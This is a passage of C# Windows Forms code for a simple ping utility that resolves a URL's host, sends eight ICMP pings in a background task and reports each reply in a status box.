            get.InjectButton(this, quit, "X", this.Width - 74, -3, 74, 24, 12, 16, 16, 16, 255, 255, 255, 24, 24, 24, 255, 255, 255);

            Uri uri = new Uri(Target);
            var Ip = Dns.GetHostAddresses(uri.Host)[0];
            url = Target;
            target = Ip.ToString();

            Status.AppendText($"* we are going to ping {Target} / {target}!\r\n");
            Status.AppendText("* with 74 bytes, 8 cycles all over ICMPv4.\r\n\r\n");

            var Tokend = new CancellationTokenSource();
            CancellationToken Ct = Tokend.Token;

            IsPinging = true;
            Task Pinger = Task.Run((Action)RunPing, Tokend.Token);

            quit.Click += (sender, argumentation) =>
            {
                IsPinging = false;
                Tokend.Cancel();
                this.Close();
            };
        }

        static void RunPing()
        {
            while (IsPinging == true)
            {
                for (int index = 1; index <= 8; index += 1)
                {
                    Ping pingah = new Ping();
                    PingReply reply = pingah.Send(target, 1000);

                    if (reply.Status != IPStatus.Success) Status.AppendText($"[{index}] no reply has been received from {url}!\r\n");
                    else { Status.AppendText($"[{index}] we have received a reply from {url} in {reply.RoundtripTime}ms!\r\n"); System.Threading.Thread.Sleep(500); }

                    pingah.Dispose();
                    IsPinging = false;
                }

                Status.AppendText("\r\n* the results are shown above!\r\n");
                Status.AppendText("* we have successfully pinged the target.");
            }
        }
    }
}
